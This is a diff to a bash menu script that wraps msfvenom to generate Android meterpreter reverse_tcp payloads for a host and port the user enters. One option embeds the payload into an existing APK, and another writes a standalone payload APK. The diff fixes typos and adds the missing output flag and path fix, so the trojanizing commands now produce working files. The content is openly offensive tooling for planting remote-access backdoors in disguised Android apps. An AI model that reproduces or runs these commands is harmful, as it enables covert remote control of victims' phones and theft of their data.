@@ -21,9 +21,9 @@ echo "Enter PORT"
 read -p ">|" port
 echo "Please enter the complete path with .apk extension that you want to embed with"
 read -p ">|" p1
-echo "Please enter the complete path with .apk extension that you want to embed with"
+echo "Please enter the complete path with .apk extension where you want to save the embedded apk to"
 read -p ">|" p4
-msfvenom -x $p1 -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port
+msfvenom -x $p1 -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o $p4
 elif [ $o = "2" ]
 then
 echo "Enter HOST"
@@ -31,9 +31,9 @@ read -p ">|" host1
 echo "Enter PORT"
 read -p ">|" port1
 echo "Please enter the complete path with .apk extension"
-echo "where you want to dave the payload to"
+echo "where you want to save the payload to"
 read -p ">|" p2
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$host1 LPORT=$port1 R > /$p2
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$host1 LPORT=$port1 R > $p2
 elif [ $o = "4" ]
 then
 exit
